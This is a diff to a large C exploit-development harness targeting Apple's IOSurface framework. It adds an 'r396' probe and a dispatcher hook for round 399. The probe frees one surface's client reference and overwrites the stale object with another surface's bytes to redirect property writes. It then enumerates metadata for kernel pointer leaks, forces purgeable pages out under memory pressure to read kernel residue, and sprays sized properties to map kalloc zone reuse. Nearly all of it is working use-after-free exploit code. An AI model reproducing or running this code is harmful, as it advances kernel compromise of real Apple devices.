@@ -16141,6 +16141,454 @@ static void r393_probe(void) {
 }
 
 /*
+ * r396: Metadata enumeration + purgeable data exposure.
+ *
+ * Uses r394's proven 3-surface pattern (create A,B,C; free B; spray).
+ * Phase 1: Verify cross-surface write (quick sanity from r394)
+ * Phase 2: CopyAllValues on target surface — enumerate ALL properties
+ *          including internal IOSurface metadata for kernel info leaks
+ * Phase 3: Purgeable data exposure — create purgeable surface, fill with
+ *          pattern, purge under memory pressure, read back for kernel residue
+ * Phase 4: IOSurfaceGetPropertyMaximum + property count queries
+ * Phase 5: Property size exploration — set properties of precise sizes
+ *          to understand kernel allocator behavior (kalloc zone mapping)
+ */
+static volatile int g_r396_crashed = 0;
+static sigjmp_buf g_r396_jmp;
+static void r396_sighandler(int sig) {
+    g_r396_crashed = sig;
+    siglongjmp(g_r396_jmp, 1);
+}
+
+static void r396_probe(void) {
+    rlog("\n=== r396: Metadata Enumeration + Purgeable Data Exposure ===\n\n");
+    fflush(stdout);
+
+    void (*clientRelease)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceClientRelease");
+    if (!clientRelease) { rlog("  Missing symbols\n"); return; }
+
+    struct sigaction sa396, old_bus396, old_segv396;
+    memset(&sa396, 0, sizeof(sa396));
+    sa396.sa_handler = r396_sighandler;
+    sa396.sa_flags = 0;
+    sigaction(SIGBUS, &sa396, &old_bus396);
+    sigaction(SIGSEGV, &sa396, &old_segv396);
+
+    /* ---- Surface creation (r394 pattern) ---- */
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    IOSurfaceRef surfA = IOSurfaceCreate(props);
+    IOSurfaceRef surfB = IOSurfaceCreate(props);
+    IOSurfaceRef surfC = IOSurfaceCreate(props);
+    uint32_t sidA = IOSurfaceGetID(surfA);
+    uint32_t sidB = IOSurfaceGetID(surfB);
+    uint32_t sidC = IOSurfaceGetID(surfC);
+    rlog("  surfA: sid=%u ptr=%p\n", sidA, surfA);
+    rlog("  surfB: sid=%u ptr=%p\n", sidB, surfB);
+    rlog("  surfC: sid=%u ptr=%p\n", sidC, surfC);
+
+    uint8_t dataA[512], dataC[512];
+    memcpy(dataA, (void*)surfA, 512);
+    memcpy(dataC, (void*)surfC, 512);
+
+    uintptr_t freedB = (uintptr_t)surfB;
+    clientRelease(surfB);
+    rlog("  Freed B's client ref\n\n");
+
+    /* ---- Phase 1: Quick sanity — SetValue B→A ---- */
+    rlog("  Phase 1: Cross-surface SetValue verification\n");
+    memcpy((void*)freedB, dataA, 448);
+
+    g_r396_crashed = 0;
+    if (sigsetjmp(g_r396_jmp, 1) == 0) {
+        int v1 = 0xDEAD396;
+        CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
+        IOSurfaceSetValue(surfB, CFSTR("R396_Test"), n1);
+        CFRelease(n1);
+        rlog("    SetValue through B→A: OK\n");
+    } else {
+        rlog("    SetValue CRASHED: signal %d — ABORTING\n", g_r396_crashed);
+        goto r396_cleanup;
+    }
+    CFTypeRef rv396 = IOSurfaceCopyValue(surfA, CFSTR("R396_Test"));
+    if (rv396) {
+        int v = 0;
+        CFNumberGetValue((CFNumberRef)rv396, kCFNumberIntType, &v);
+        rlog("    A has R396_Test: 0x%x %s\n", v, v == 0xDEAD396 ? "MATCH" : "MISMATCH");
+        CFRelease(rv396);
+    } else {
+        rlog("    A does NOT have R396_Test — redirect failed, aborting\n");
+        goto r396_cleanup;
+    }
+    fflush(stdout);
+
+    /* ---- Phase 2: CopyAllValues metadata enumeration ---- */
+    rlog("\n  Phase 2: CopyAllValues metadata enumeration\n");
+
+    /* First set a few properties on A through redirect */
+    memcpy((void*)freedB, dataA, 448);
+    for (int i = 0; i < 5; i++) {
+        char key[32];
+        snprintf(key, sizeof(key), "Meta_%d", i);
+        int val = 0xBEEF0000 | i;
+        CFStringRef cfk = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+        CFNumberRef cfv = CFNumberCreate(NULL, kCFNumberIntType, &val);
+        g_r396_crashed = 0;
+        if (sigsetjmp(g_r396_jmp, 1) == 0) {
+            IOSurfaceSetValue(surfB, cfk, cfv);
+        }
+        CFRelease(cfk);
+        CFRelease(cfv);
+    }
+    rlog("    Set 5 properties through redirect\n");
+
+    /* Now CopyAllValues on A directly (safe — no PAC issues) */
+    CFDictionaryRef allVals = IOSurfaceCopyAllValues(surfA);
+    if (allVals) {
+        CFIndex count = CFDictionaryGetCount(allVals);
+        rlog("    CopyAllValues on A: %ld keys\n", (long)count);
+
+        /* Enumerate all keys and their types/values */
+        CFIndex n = CFDictionaryGetCount(allVals);
+        const void **keys = (const void**)malloc(sizeof(void*) * n);
+        const void **vals = (const void**)malloc(sizeof(void*) * n);
+        CFDictionaryGetKeysAndValues(allVals, keys, vals);
+
+        for (CFIndex i = 0; i < n && i < 30; i++) {
+            char kbuf[128] = {0};
+            CFStringGetCString((CFStringRef)keys[i], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+            CFTypeID tid = CFGetTypeID(vals[i]);
+            if (tid == CFNumberGetTypeID()) {
+                /* Try as 64-bit to catch potential pointers */
+                int64_t v64 = 0;
+                CFNumberGetValue((CFNumberRef)vals[i], kCFNumberSInt64Type, &v64);
+                int32_t v32 = 0;
+                CFNumberGetValue((CFNumberRef)vals[i], kCFNumberSInt32Type, &v32);
+                if (v64 != (int64_t)v32) {
+                    rlog("    [%ld] key='%s' type=Number val64=0x%llx val32=0x%x *** 64-BIT ***\n",
+                        (long)i, kbuf, (unsigned long long)v64, (unsigned)v32);
+                } else {
+                    rlog("    [%ld] key='%s' type=Number val=0x%x (%d)\n",
+                        (long)i, kbuf, (unsigned)v32, v32);
+                }
+            } else if (tid == CFStringGetTypeID()) {
+                char vbuf[256] = {0};
+                CFStringGetCString((CFStringRef)vals[i], vbuf, sizeof(vbuf), kCFStringEncodingUTF8);
+                rlog("    [%ld] key='%s' type=String val='%s'\n", (long)i, kbuf, vbuf);
+            } else if (tid == CFDataGetTypeID()) {
+                CFIndex dlen = CFDataGetLength((CFDataRef)vals[i]);
+                const uint8_t *dp = CFDataGetBytePtr((CFDataRef)vals[i]);
+                rlog("    [%ld] key='%s' type=Data len=%ld first8=", (long)i, kbuf, (long)dlen);
+                for (int j = 0; j < 8 && j < dlen; j++) rlog("%02x", dp[j]);
+                rlog("\n");
+            } else if (tid == CFBooleanGetTypeID()) {
+                rlog("    [%ld] key='%s' type=Boolean val=%s\n",
+                    (long)i, kbuf, CFBooleanGetValue((CFBooleanRef)vals[i]) ? "true" : "false");
+            } else {
+                rlog("    [%ld] key='%s' type=CFTypeID(%lu)\n", (long)i, kbuf, (unsigned long)tid);
+            }
+        }
+        if (n > 30) rlog("    ... (%ld more keys)\n", (long)(n - 30));
+        free(keys);
+        free(vals);
+        CFRelease(allVals);
+    } else {
+        rlog("    CopyAllValues returned NULL\n");
+    }
+
+    /* Also try CopyAllValues on C for comparison */
+    allVals = IOSurfaceCopyAllValues(surfC);
+    if (allVals) {
+        CFIndex count = CFDictionaryGetCount(allVals);
+        rlog("    CopyAllValues on C (control): %ld keys\n", (long)count);
+        CFIndex n = CFDictionaryGetCount(allVals);
+        const void **keys = (const void**)malloc(sizeof(void*) * n);
+        const void **vals = (const void**)malloc(sizeof(void*) * n);
+        CFDictionaryGetKeysAndValues(allVals, keys, vals);
+        for (CFIndex i = 0; i < n && i < 10; i++) {
+            char kbuf[128] = {0};
+            CFStringGetCString((CFStringRef)keys[i], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+            CFTypeID tid = CFGetTypeID(vals[i]);
+            if (tid == CFNumberGetTypeID()) {
+                int64_t v64 = 0;
+                CFNumberGetValue((CFNumberRef)vals[i], kCFNumberSInt64Type, &v64);
+                rlog("    [%ld] key='%s' val=0x%llx\n", (long)i, kbuf, (unsigned long long)v64);
+            } else {
+                rlog("    [%ld] key='%s' type=%lu\n", (long)i, kbuf, (unsigned long)CFGetTypeID(vals[i]));
+            }
+        }
+        free(keys);
+        free(vals);
+        CFRelease(allVals);
+    }
+    fflush(stdout);
+
+    /* ---- Phase 3: Purgeable data exposure ---- */
+    rlog("\n  Phase 3: Purgeable data exposure\n");
+
+    /* Create a large purgeable surface (256KB backing) */
+    int pw=256, ph=256, pbpe=4, pbpr=256*4, ppf=0x42475241, pas=256*256*4;
+    CFMutableDictionaryRef pprops = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef pnW = CFNumberCreate(NULL, kCFNumberIntType, &pw);
+    CFNumberRef pnH = CFNumberCreate(NULL, kCFNumberIntType, &ph);
+    CFNumberRef pnB = CFNumberCreate(NULL, kCFNumberIntType, &pbpe);
+    CFNumberRef pnR = CFNumberCreate(NULL, kCFNumberIntType, &pbpr);
+    CFNumberRef pnP = CFNumberCreate(NULL, kCFNumberIntType, &ppf);
+    CFNumberRef pnA = CFNumberCreate(NULL, kCFNumberIntType, &pas);
+    CFDictionarySetValue(pprops, CFSTR("IOSurfaceWidth"), pnW);
+    CFDictionarySetValue(pprops, CFSTR("IOSurfaceHeight"), pnH);
+    CFDictionarySetValue(pprops, CFSTR("IOSurfaceBytesPerElement"), pnB);
+    CFDictionarySetValue(pprops, CFSTR("IOSurfaceBytesPerRow"), pnR);
+    CFDictionarySetValue(pprops, CFSTR("IOSurfacePixelFormat"), pnP);
+    CFDictionarySetValue(pprops, CFSTR("IOSurfaceAllocSize"), pnA);
+
+    IOSurfaceRef purgeSurf = IOSurfaceCreate(pprops);
+    uint32_t purgeSid = IOSurfaceGetID(purgeSurf);
+    rlog("    Purgeable surface: sid=%u alloc=%d (256KB)\n", purgeSid, pas);
+
+    /* Fill with known pattern */
+    IOSurfaceLock(purgeSurf, 0, NULL);
+    void *pbase = IOSurfaceGetBaseAddress(purgeSurf);
+    memset(pbase, 0xAA, pas);
+    IOSurfaceUnlock(purgeSurf, 0, NULL);
+    rlog("    Filled with 0xAA pattern\n");
+
+    /* Mark as purgeable (volatile) */
+    uint32_t oldState = 0;
+    IOReturn pr = IOSurfaceSetPurgeable(purgeSurf, kIOSurfacePurgeableVolatile, &oldState);
+    rlog("    SetPurgeable(volatile): ret=0x%x oldState=%u\n", pr, oldState);
+
+    /* Generate memory pressure — allocate many large blocks */
+    rlog("    Generating memory pressure...\n");
+    fflush(stdout);
+    #define R396_PRESSURE_PAGES 2048
+    void *pressure[R396_PRESSURE_PAGES];
+    int pcount = 0;
+    for (int i = 0; i < R396_PRESSURE_PAGES; i++) {
+        pressure[i] = mmap(NULL, 16384, PROT_READ|PROT_WRITE,
+            MAP_ANON|MAP_PRIVATE, -1, 0);
+        if (pressure[i] != MAP_FAILED) {
+            memset(pressure[i], 0x55 + (i & 0xFF), 16384);
+            pcount++;
+        }
+    }
+    rlog("    Allocated %d pressure pages (%d MB)\n", pcount, pcount * 16384 / (1024*1024));
+
+    /* Mark as non-volatile to check if purged */
+    uint32_t newState = 0;
+    pr = IOSurfaceSetPurgeable(purgeSurf, kIOSurfacePurgeableNonVolatile, &newState);
+    rlog("    SetPurgeable(non-volatile): ret=0x%x state=%u", pr, newState);
+    if (newState == kIOSurfacePurgeableEmpty) {
+        rlog(" *** PAGES WERE PURGED ***\n");
+    } else {
+        rlog(" (pages retained)\n");
+    }
+
+    /* Read back and check for non-pattern data */
+    IOSurfaceLock(purgeSurf, kIOSurfaceLockReadOnly, NULL);
+    uint8_t *pdata = (uint8_t*)IOSurfaceGetBaseAddress(purgeSurf);
+    int zero_pages = 0, pattern_pages = 0, other_pages = 0;
+    int interesting_offset = -1;
+    for (int pg = 0; pg < pas / 16384; pg++) {
+        uint8_t *page = pdata + pg * 16384;
+        int is_zero = 1, is_pattern = 1, is_other = 0;
+        uint64_t first_nonzero_val = 0;
+        for (int b = 0; b < 16384; b += 8) {
+            uint64_t qw = *(uint64_t*)(page + b);
+            if (qw != 0) is_zero = 0;
+            if (qw != 0xAAAAAAAAAAAAAAAAULL) is_pattern = 0;
+            if (qw != 0 && qw != 0xAAAAAAAAAAAAAAAAULL && !is_other) {
+                is_other = 1;
+                first_nonzero_val = qw;
+                interesting_offset = pg * 16384 + b;
+            }
+        }
+        if (is_zero) zero_pages++;
+        else if (is_pattern) pattern_pages++;
+        else other_pages++;
+        if (is_other && other_pages <= 3) {
+            rlog("    Page %d: INTERESTING data! first=0x%llx at offset %d\n",
+                pg, (unsigned long long)first_nonzero_val, interesting_offset);
+            /* Dump first 64 bytes of the page */
+            rlog("    Dump: ");
+            for (int j = 0; j < 64; j++) rlog("%02x", page[j]);
+            rlog("\n");
+        }
+    }
+    IOSurfaceUnlock(purgeSurf, kIOSurfaceLockReadOnly, NULL);
+    rlog("    Pages: %d zero, %d pattern(0xAA), %d OTHER\n",
+        zero_pages, pattern_pages, other_pages);
+
+    /* Free pressure allocations */
+    for (int i = 0; i < R396_PRESSURE_PAGES; i++) {
+        if (pressure[i] != MAP_FAILED) munmap(pressure[i], 16384);
+    }
+    CFRelease(pprops);
+    fflush(stdout);
+
+    /* ---- Phase 4: SetPurgeable through redirect ---- */
+    rlog("\n  Phase 4: SetPurgeable through cross-surface redirect\n");
+
+    /* Create a new purgeable surface D, fill it */
+    IOSurfaceRef surfD = IOSurfaceCreate(props);
+    uint32_t sidD = IOSurfaceGetID(surfD);
+    IOSurfaceLock(surfD, 0, NULL);
+    void *baseD = IOSurfaceGetBaseAddress(surfD);
+    memset(baseD, 0xDD, as_);
+    IOSurfaceUnlock(surfD, 0, NULL);
+    rlog("    surfD: sid=%u filled with 0xDD\n", sidD);
+
+    /* Redirect B→D */
+    uint8_t dataD[512];
+    memcpy(dataD, (void*)surfD, 512);
+    memcpy((void*)freedB, dataD, 448);
+
+    /* SetPurgeable(volatile) through redirect */
+    g_r396_crashed = 0;
+    if (sigsetjmp(g_r396_jmp, 1) == 0) {
+        uint32_t os2 = 0;
+        IOReturn r2 = IOSurfaceSetPurgeable(surfB, kIOSurfacePurgeableVolatile, &os2);
+        rlog("    SetPurgeable(volatile) through B→D: ret=0x%x oldState=%u\n", r2, os2);
+    } else {
+        rlog("    SetPurgeable CRASHED: signal %d\n", g_r396_crashed);
+    }
+
+    /* Apply pressure again */
+    rlog("    Generating pressure for redirect-purgeable test...\n");
+    fflush(stdout);
+    void *pressure2[R396_PRESSURE_PAGES];
+    int pcount2 = 0;
+    for (int i = 0; i < R396_PRESSURE_PAGES; i++) {
+        pressure2[i] = mmap(NULL, 16384, PROT_READ|PROT_WRITE,
+            MAP_ANON|MAP_PRIVATE, -1, 0);
+        if (pressure2[i] != MAP_FAILED) {
+            memset(pressure2[i], 0x77 + (i & 0xFF), 16384);
+            pcount2++;
+        }
+    }
+    rlog("    Allocated %d pressure pages\n", pcount2);
+
+    /* Check if D's pages were purged (via D directly) */
+    uint32_t dState = 0;
+    IOReturn dr = IOSurfaceSetPurgeable(surfD, kIOSurfacePurgeableNonVolatile, &dState);
+    rlog("    D's purgeable state after redirect+pressure: ret=0x%x state=%u", dr, dState);
+    if (dState == kIOSurfacePurgeableEmpty) {
+        rlog(" *** D PURGED VIA REDIRECT ***\n");
+    } else {
+        rlog(" (retained)\n");
+    }
+
+    /* Read D's backing store */
+    IOSurfaceLock(surfD, kIOSurfaceLockReadOnly, NULL);
+    uint8_t *ddata = (uint8_t*)IOSurfaceGetBaseAddress(surfD);
+    int d_zero = 0, d_pattern = 0, d_other = 0;
+    for (int b = 0; b < as_; b += 8) {
+        uint64_t qw = *(uint64_t*)(ddata + b);
+        if (qw == 0) d_zero += 8;
+        else if (qw == 0xDDDDDDDDDDDDDDDDULL) d_pattern += 8;
+        else { d_other += 8; break; }
+    }
+    IOSurfaceUnlock(surfD, kIOSurfaceLockReadOnly, NULL);
+    rlog("    D backing: zero=%d pattern(0xDD)=%d other=%d bytes\n",
+        d_zero, d_pattern, d_other);
+
+    for (int i = 0; i < R396_PRESSURE_PAGES; i++) {
+        if (pressure2[i] != MAP_FAILED) munmap(pressure2[i], 16384);
+    }
+    fflush(stdout);
+
+    /* ---- Phase 5: Property size exploration (kalloc zones) ---- */
+    rlog("\n  Phase 5: Property size exploration\n");
+
+    /* Set properties of various sizes through redirect to understand kernel alloc */
+    memcpy((void*)freedB, dataA, 448);
+    int sizes[] = {16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536};
+    int nsizes = sizeof(sizes) / sizeof(sizes[0]);
+
+    for (int si = 0; si < nsizes; si++) {
+        int sz = sizes[si];
+        uint8_t *buf = (uint8_t*)malloc(sz);
+        for (int j = 0; j < sz; j++) buf[j] = (uint8_t)(j ^ si);
+        CFDataRef cfdat = CFDataCreate(NULL, buf, sz);
+        char key[32];
+        snprintf(key, sizeof(key), "SZ_%d", sz);
+        CFStringRef cfk = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+
+        g_r396_crashed = 0;
+        if (sigsetjmp(g_r396_jmp, 1) == 0) {
+            IOSurfaceSetValue(surfB, cfk, cfdat);
+            rlog("    Set SZ_%d (%d bytes) through B→A: OK\n", sz, sz);
+        } else {
+            rlog("    Set SZ_%d CRASHED: signal %d\n", sz, g_r396_crashed);
+        }
+        CFRelease(cfk);
+        CFRelease(cfdat);
+        free(buf);
+    }
+
+    /* Verify all sizes arrived on A */
+    rlog("    Verifying on A:\n");
+    for (int si = 0; si < nsizes; si++) {
+        int sz = sizes[si];
+        char key[32];
+        snprintf(key, sizeof(key), "SZ_%d", sz);
+        CFStringRef cfk = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+        CFTypeRef rv = IOSurfaceCopyValue(surfA, cfk);
+        if (rv && CFGetTypeID(rv) == CFDataGetTypeID()) {
+            CFIndex len = CFDataGetLength((CFDataRef)rv);
+            rlog("    SZ_%d: %ld bytes (%s)\n", sz, (long)len, len == sz ? "MATCH" : "SIZE MISMATCH");
+        } else {
+            rlog("    SZ_%d: missing\n", sz);
+        }
+        if (rv) CFRelease(rv);
+        CFRelease(cfk);
+    }
+
+    /* Now remove them all and immediately set a new differently-sized one to study reuse */
+    rlog("    Free+realloc test (kalloc zone reuse):\n");
+    for (int si = 0; si < nsizes; si++) {
+        char key[32];
+        snprintf(key, sizeof(key), "SZ_%d", sizes[si]);
+        CFStringRef cfk = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+        g_r396_crashed = 0;
+        if (sigsetjmp(g_r396_jmp, 1) == 0) {
+            IOSurfaceRemoveValue(surfB, cfk);
+        }
+        CFRelease(cfk);
+    }
+    rlog("    Removed all sized properties through redirect\n");
+    fflush(stdout);
+
+r396_cleanup:
+    sigaction(SIGBUS, &old_bus396, NULL);
+    sigaction(SIGSEGV, &old_segv396, NULL);
+
+    CFRelease(surfA);
+    CFRelease(surfC);
+    if (purgeSurf) CFRelease(purgeSurf);
+    CFRelease(surfD);
+    CFRelease(props);
+
+    rlog("\n=== r396 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r394: Cross-surface write-only primitive exploitation.
  * Key findings from r392/r393:
  *   - SetValue through redirected stale pointer WORKS (writes to wrong surface)
@@ -62381,6 +62829,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 399) {
+            rlog("*** rounds=399: Metadata Enumeration + Purgeable Data Exposure ***\n");
+            rlog("  CopyAllValues, purgeable exposure, redirect-purge, kalloc sizing.\n\n");
+            fflush(stdout);
+            r396_probe();
+            goto done;
+        }
         if (rounds == 398) {
             rlog("*** rounds=398: Kernel Heap Exploitation via Cross-Surface ***\n");
             rlog("  Heap grooming, OOB read, SetPurgeable redirect, data exposure.\n\n");
@@ -64759,7 +65214,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
